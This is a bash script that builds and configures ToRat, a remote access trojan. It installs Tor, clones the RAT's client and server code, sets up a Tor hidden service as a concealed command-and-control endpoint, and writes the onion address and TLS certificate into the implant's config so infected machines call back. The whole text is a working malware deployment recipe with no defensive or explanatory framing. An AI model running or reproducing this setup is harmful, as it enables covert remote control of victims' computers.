sudo apt install golang-go tor -y

git clone https://github.com/lu4p/ToRat_client.git
git clone https://github.com/lu4p/ToRat_server.git
git clone https://github.com/lu4p/genCert.git

sudo tee -a /etc/tor/torrc <<EOF
HiddenServiceDir /var/lib/tor/torat/
HiddenServiceVersion 3
HiddenServicePort 1337 127.0.0.1:1338
EOF

sudo systemctl restart tor

hostname=$(sudo cat /var/lib/tor/torat/hostname)

cd ./genCert
go run genCert.go --ca --host $hostname
cp *.pem ../ToRat_server
cd ..
cert=$(cat ./ToRat_server/cert.pem)

conf=$(cat << EOF
package client

import "github.com/lu4p/ToRat_client/crypto"

const (
	// serverDomain needs to be changed to your address
	serverDomain = "${hostname}"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert needs to be changed to the TLS certificate of the server
// intendation breaks the certificate
const serverCert = \`${cert}\`

var (
	ServerPubKey, _ = crypto.CertToPubKey(serverCert)
)
EOF
)

rm ./ToRat_client/client/conf.go -f
tee -a ./ToRat_client/client/conf.go<<EOF
${conf}

EOF

